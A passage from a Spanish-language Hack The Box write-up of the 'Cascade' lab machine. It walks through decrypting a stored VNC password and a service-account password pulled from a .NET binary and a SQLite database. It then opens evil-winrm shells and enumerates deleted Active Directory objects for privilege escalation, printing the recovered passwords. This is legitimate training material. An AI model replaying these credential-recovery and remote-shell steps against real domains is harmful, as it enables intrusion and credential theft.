<span class="s2">"VideoRects"</span><span class="o">=</span><span class="s2">""</span>
</code></pre></div></div>

<ul>
  <li>Esta línea es interesante <a href="https://www.geeknetic.es/VNC/que-es-y-para-que-sirve">https://www.geeknetic.es/VNC/que-es-y-para-que-sirve</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">"Password"</span><span class="o">=</span>hex:6b,cf,2a,4b,6e,5a,ca,0f
</code></pre></div></div>

<ul>
  <li>
    <p>Aquí encontramos información donde nos dicen como podemos ver la contraseña en texto plano <a href="https://github.com/frizb/PasswordDecrypts">https://github.com/frizb/PasswordDecrypts</a>.</p>
  </li>
  <li>
    <p>Encontramos esta herramienta <a href="https://github.com/jeroennijhof/vncpwd">https://github.com/jeroennijhof/vncpwd</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  /opt <span class="nb">sudo </span>git clone https://github.com/jeroennijhof/vncpwd
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
Cloning into <span class="s1">'vncpwd'</span>...
remote: Enumerating objects: 28, <span class="k">done</span><span class="nb">.</span>
remote: Total 28 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 28
Receiving objects: 100% <span class="o">(</span>28/28<span class="o">)</span>, 22.15 KiB | 290.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
➜  /opt <span class="nb">cd </span>vncpwd
➜  vncpwd <span class="nb">sudo </span>gcc <span class="nt">-o</span> vncpwd vncpwd.c d3des.c
</code></pre></div></div>

<ul>
  <li>Vamos a pasar los caracteres o la string a un archivo pero la vamos a guardar en formato binario ya que la contraseña codificada corresponde para un servidor VNC.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith <span class="nb">echo</span> <span class="s1">'6bcf2a4b6e5aca0f'</span> | xxd <span class="nt">-r</span> <span class="nt">-p</span> <span class="o">&gt;</span> vnc_pass
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos usar la herramienta y ver la contraseña.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith /opt/vncpwd/vncpwd vnc_pass
Password: sT333ve2
</code></pre></div></div>

<ul>
  <li>En el repositorio de GitHub también nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">Metasploit</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith msfconsole
Metasploit tip: Search can apply complex filters such as search cve:2009
<span class="nb">type</span>:exploit, see all the filters with <span class="nb">help </span>search


                                   .,,.                  <span class="nb">.</span>
                                .<span class="se">\$</span><span class="nv">$$$$</span>L..,,<span class="o">==</span>aaccaacc%#s<span class="nv">$b</span><span class="nb">.</span>       d8,    d8P
                     d8P        <span class="c">#$$$$$$$$$$$$$$$$$$$$$$$$$$$b.    `BP  d888888p</span>
                  d888888P      <span class="s1">'7$$$$\""""''^^`` .7$$$|D*"'</span><span class="sb">```</span>         ?88<span class="s1">'
  d8bd8b.d8p d8888b ?88'</span> d888b8b            _.os#<span class="nv">$|</span>8<span class="k">*</span><span class="s2">"</span><span class="sb">`</span>   d8P       ?8b  88P
  88P<span class="sb">`</span><span class="s2">?P'?P d8b_,dP 88P d8P' ?88       .oaS###S*"</span><span class="sb">`</span>       d8P d8888b <span class="nv">$whi</span>?88b 88b
 d88  d8 ?8 88b     88b 88b  ,88b .osS<span class="nv">$$$$</span><span class="k">*</span><span class="s2">" ?88,.d88b, d88 d8P' ?88 88P </span><span class="sb">`</span>?8b
d88<span class="s1">' d88b 8b`?8888P'</span><span class="sb">`</span><span class="s2">?8b</span><span class="sb">`</span>?88P<span class="s1">'.aS$$$$Q*"`    `?88'</span>  ?88 ?88 88b  d88 d88
                          .a#<span class="nv">$$$$$$</span><span class="s2">"</span><span class="sb">`</span>          88b  d8P  88b<span class="sb">`</span><span class="s2">?8888P'
                       ,s</span><span class="nv">$$$$$$</span><span class="s2">$"</span><span class="sb">`</span><span class="s2">             888888P'   88n      _.,,,ass;:
                    .a</span><span class="nv">$$$$$$$P</span><span class="sb">`</span>               d88P<span class="s1">'    .,.ass%#S$$$$$$$$$$$$$$'</span>
                 .a<span class="nv">$##</span><span class="c">#$$$P`           _.,,-aqsc#SS$$$$$$$$$$$$$$$$$$$$$$$$$$'</span>
              ,a<span class="nv">$$</span><span class="c">###$$P`  _.,-ass#S$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$####SSSS'</span>
           .a<span class="nv">$$$$$$$$$$</span>SSS<span class="nv">$$$$$$$$$$$$$$$$$$$$$$$$$$$$</span>SS##<span class="o">==</span><span class="nt">--</span><span class="s2">""</span><span class="s1">''</span>^^/<span class="nv">$$$$$$</span><span class="s1">'
_______________________________________________________________   ,&amp;$$$$$$'</span>_____
                                                                 ll&amp;&amp;<span class="nv">$$$$</span><span class="s1">'
                                                              .;;lll&amp;&amp;&amp;&amp;'</span>
                                                            ...<span class="p">;;</span>lllll&amp;<span class="s1">'
                                                          ......;;;llll;;;....
                                                           ` ......;;;;... .  .


       =[ metasploit v6.4.2-dev                           ]
+ -- --=[ 2408 exploits - 1240 auxiliary - 422 post       ]
+ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; irb
[*] Starting IRB shell...
[*] You are in the "framework" object

irb: warn: can'</span>t <span class="nb">alias jobs </span>from irb_jobs.
<span class="o">&gt;&gt;</span> fixedkey <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">52</span><span class="se">\x</span><span class="s2">6b</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">23</span><span class="se">\x</span><span class="s2">4e</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">07"</span>
<span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">17Rk</span><span class="se">\x</span><span class="s2">06#NX</span><span class="se">\a</span><span class="s2">"</span>
<span class="o">&gt;&gt;</span> require <span class="s1">'rex/proto/rfb'</span>
<span class="o">=&gt;</span> <span class="nb">true</span>
<span class="o">&gt;&gt;</span> Rex::Proto::RFB::Cipher.decrypt <span class="o">[</span><span class="s2">"6bcf2a4b6e5aca0f"</span><span class="o">]</span>.pack<span class="o">(</span><span class="s1">'H*'</span><span class="o">)</span>, fixedkey
<span class="o">=&gt;</span> <span class="s2">"sT333ve2"</span>
</code></pre></div></div>

<h2 id="user-txt">User txt</h2>

<ul>
  <li>Ahora comprobamos las credenciales al estar en el directorio <code class="language-plaintext highlighter-rouge">s.smith</code> le corresponden a ese usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ya nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  s.smith evil-winrm <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2 <span class="nt">-i</span> 10.10.10.182

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>cascade<span class="se">\s</span>.smith
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
8b885675a5366ad864fed27bc2c8f4ed
</code></pre></div></div>

<h2 id="arksvc">arksvc</h2>

<ul>
  <li>No vemos nada interesante.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>El usuario pertenece al grupo <code class="language-plaintext highlighter-rouge">Audit Share</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; net user s.smith
User name                    s.smith
Full Name                    Steve Smith
Comment
User<span class="s1">'s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/28/2020 8:58:05 PM
Password expires             Never
Password changeable          1/28/2020 8:58:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 MapAuditDrive.vbs
User profile
Home directory
Last logon                   1/29/2020 12:26:39 AM

Logon hours allowed          All

Local Group Memberships      *Audit Share          *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></code></pre></div></div>

<ul>
  <li>Solamente nosotros somos miembros de ese grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>.smith<span class="se">\D</span>ocuments&gt; net localgroup <span class="s2">"Audit Share"</span>
Alias name     Audit Share
Comment        <span class="se">\\</span>Casc-DC1<span class="se">\A</span>udit<span class="err">$</span>

Members

<span class="nt">-------------------------------------------------------------------------------</span>
s.smith
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Vemos que hay otro usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
d-----        3/25/2020  11:17 AM                Administrator
d-----        1/28/2020  11:37 PM                arksvc
d-r---        7/14/2009   5:57 AM                Public
d-----        1/15/2020  10:22 PM                s.smith
</code></pre></div></div>

<ul>
  <li>No vemos nada interesante así vamos a ver recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.10.182 <span class="nt">-u</span> s.smith <span class="nt">-p</span> sT333ve2 <span class="nt">--shares</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 x64 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\s</span>.smith:sT333ve2
SMB         10.10.10.182    445    CASC-DC1         <span class="o">[</span>+] Enumerated shares
SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark
SMB         10.10.10.182    445    CASC-DC1         <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.10.182    445    CASC-DC1         ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.10.182    445    CASC-DC1         Audit<span class="nv">$ </span>         READ
SMB         10.10.10.182    445    CASC-DC1         C<span class="nv">$ </span>                             Default share
SMB         10.10.10.182    445    CASC-DC1         Data            READ
SMB         10.10.10.182    445    CASC-DC1         IPC<span class="nv">$ </span>                           Remote IPC
SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share
SMB         10.10.10.182    445    CASC-DC1         print<span class="nv">$ </span>         READ            Printer Drivers
SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos a <code class="language-plaintext highlighter-rouge">Audit$</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.10.182/Audit<span class="nv">$ </span><span class="nt">-U</span> s.smith%sT333ve2
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Jan 29 12:01:26 2020
  ..                                  D        0  Wed Jan 29 12:01:26 2020
  CascAudit.exe                      An    13312  Tue Jan 28 15:46:51 2020
  CascCrypto.dll                     An    12288  Wed Jan 29 12:00:20 2020
  DB                                  D        0  Tue Jan 28 15:40:59 2020
  RunAudit.bat                        A       45  Tue Jan 28 17:29:47 2020
  System.Data.SQLite.dll              A   363520  Sun Oct 27 01:38:36 2019
  System.Data.SQLite.EF6.dll          A   186880  Sun Oct 27 01:38:38 2019
  x64                                 D        0  Sun Jan 26 16:25:27 2020
  x86                                 D        0  Sun Jan 26 16:25:27 2020

		6553343 blocks of size 4096. 1624921 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<ul>
  <li>Vamos a descargarnos todo eso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> prompt OFF
smb: <span class="se">\&gt;</span> recurse ON
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
getting file <span class="se">\C</span>ascAudit.exe of size 13312 as CascAudit.exe <span class="o">(</span>30.7 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 30.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\C</span>ascCrypto.dll of size 12288 as CascCrypto.dll <span class="o">(</span>34.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 32.4 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\R</span>unAudit.bat of size 45 as RunAudit.bat <span class="o">(</span>0.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 22.5 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\S</span>ystem.Data.SQLite.dll of size 363520 as System.Data.SQLite.dll <span class="o">(</span>444.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 198.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\S</span>ystem.Data.SQLite.EF6.dll of size 186880 as System.Data.SQLite.EF6.dll <span class="o">(</span>130.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 169.9 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\D</span>B<span class="se">\A</span>udit.db of size 24576 as DB/Audit.db <span class="o">(</span>70.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 160.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\x</span>64<span class="se">\S</span>QLite.Interop.dll of size 1639936 as x64/SQLite.Interop.dll <span class="o">(</span>1431.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 458.7 KiloBytes/sec<span class="o">)</span>
getting file <span class="se">\x</span>86<span class="se">\S</span>QLite.Interop.dll of size 1246720 as x86/SQLite.Interop.dll <span class="o">(</span>923.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 559.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si vemos el archivo <code class="language-plaintext highlighter-rouge">.bat</code> lo único que hace es correr el binario y pone la información en un <code class="language-plaintext highlighter-rouge">.db</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>RunAudit.bat
CascAudit.exe <span class="s2">"</span><span class="se">\\</span><span class="s2">CASC-DC1</span><span class="se">\A</span><span class="s2">udit</span><span class="nv">$\</span><span class="s2">DB</span><span class="se">\A</span><span class="s2">udit.db"</span>
</code></pre></div></div>

<ul>
  <li>Vamos a ver el <code class="language-plaintext highlighter-rouge">.db</code> .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  DB file Audit.db
Audit.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 60, database pages 6, 1st free page 6, free pages 1, cookie 0x4b, schema 4, UTF-8, version-valid-for 60
</code></pre></div></div>

<ul>
  <li>Podemos <code class="language-plaintext highlighter-rouge">dumpear</code> la información usando <code class="language-plaintext highlighter-rouge">sqlite3</code> comenzamos por las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  DB sqlite3 Audit.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .tables
DeletedUserAudit  Ldap              Misc
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ver lo que contienen las tablas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qlite&gt; <span class="k">select</span> <span class="k">*</span> from DeletedUserAudit<span class="p">;</span>
6|test|Test
DEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d|CN<span class="o">=</span>Test<span class="se">\0</span>ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>7|deleted|deleted guy
DEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef|CN<span class="o">=</span>deleted guy<span class="se">\0</span>ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>9|TempAdmin|TempAdmin
DEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a|CN<span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>sqlite&gt; <span class="k">select</span> <span class="k">*</span> from Ldap<span class="p">;</span>
1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw<span class="o">==</span>|cascade.local
sqlite&gt; <span class="k">select</span> <span class="k">*</span> from Misc<span class="p">;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>No vemos nada interesante.</p>
  </li>
  <li>
    <p>Vamos a pasar el binario a una maquina Windows para examinarlo con <code class="language-plaintext highlighter-rouge">DNSpy</code> <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content file CascAudit.exe
CascAudit.exe: PE32 executable <span class="o">(</span>console<span class="o">)</span> Intel 80386 Mono/.Net assembly, <span class="k">for </span>MS Windows, 3 sections
</code></pre></div></div>

<ul>
  <li>En esta parte del código encontramos una contraseña.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/code.png" />
</p>

<ul>
  <li>
    <p>La <code class="language-plaintext highlighter-rouge">key</code> se utiliza al momento de cifrar la contraseña <code class="language-plaintext highlighter-rouge">c4scadek3y654321</code>.</p>
  </li>
  <li>
    <p>Si vemos allí llama ala <code class="language-plaintext highlighter-rouge">dll</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/code2.png" />
</p>

<ul>
  <li>
    <p>Vamos a debugear el <code class="language-plaintext highlighter-rouge">dll</code> ya que allí se hace lo del proceso de cifrar la contraseña.</p>
  </li>
  <li>
    <p>Podemos ver el <code class="language-plaintext highlighter-rouge">DefaultIV</code> <code class="language-plaintext highlighter-rouge">1tdyjCbY1Ix49842</code> además de saber que se usa  <code class="language-plaintext highlighter-rouge">CipherMode.CBC</code> .</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/ex.png" />
</p>

<ul>
  <li>
    <p>La password es la que encontramos en el sqlite3 <code class="language-plaintext highlighter-rouge">1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local</code>.</p>
  </li>
  <li>
    <p>Si le pasamos lo que nos pide hacer el <code class="language-plaintext highlighter-rouge">decrypt</code> <code class="language-plaintext highlighter-rouge">w3lc0meFr31nd</code> nos da la contraseña en texto plano.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/pass.png" />
</p>

<ul>
  <li>Si vemos si las credenciales son correctas vemos que si.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.10.182 <span class="nt">-u</span> arksvc <span class="nt">-p</span> w3lc0meFr31nd
SMB         10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 Build 7601 <span class="o">(</span>name:CASC-DC1<span class="o">)</span> <span class="o">(</span>domain:cascade.local<span class="o">)</span>
HTTP        10.10.10.182    5985   CASC-DC1         <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.10.182:5985/wsman
WINRM       10.10.10.182    5985   CASC-DC1         <span class="o">[</span>+] cascade.local<span class="se">\a</span>rksvc:w3lc0meFr31nd <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.10.182 <span class="nt">-u</span> <span class="s1">'arksvc'</span> <span class="nt">-p</span> <span class="s1">'w3lc0meFr31nd'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>cascade<span class="se">\a</span>rksvc
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<ul>
  <li>Estamos en el grupo <code class="language-plaintext highlighter-rouge">AD Recycle Bin</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; net user arksvc
User name                    arksvc
Full Name                    ArkSvc
Comment
User<span class="s1">'s comment
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/9/2020 5:18:20 PM
Password expires             Never
Password changeable          1/9/2020 5:18:20 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/29/2020 10:05:40 PM

Logon hours allowed          All

Local Group Memberships      *AD Recycle Bin       *IT
                             *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
</span></code></pre></div></div>

<blockquote>
  <p>Cuando la Papelera de Reciclaje de AD está habilitada, los objetos de Active Directory que son eliminados no se eliminan de forma permanente de inmediato. En lugar de eso, pasan a un estado denominado “logical delete” o eliminación lógica. Durante este período, los objetos pueden ser restaurados completamente, incluyendo todos sus atributos y configuraciones de seguridad anteriores, como si nunca hubiesen sido eliminados.</p>
</blockquote>

<ul>
  <li><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/cascade/chota.png" />
</p>

<ul>
  <li>Con este comando podemos ver objetos borrados.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-filter</span> <span class="s1">'isDeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="nt">-includeDeletedObjects</span>


Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos sobre <code class="language-plaintext highlighter-rouge">TempAdmin</code> si recordamos en el correo nos decían que la contraseña de ese usuario era la misma que la del <code class="language-plaintext highlighter-rouge">admin</code>.</p>
  </li>
  <li>
    <p>Podemos listar las propiedades y encontramos una contraseña.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-filter</span> <span class="s1">'isDeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="nt">-includeDeletedObjects</span> <span class="nt">-Properties</span> <span class="k">*</span>


accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/CASC-WS1
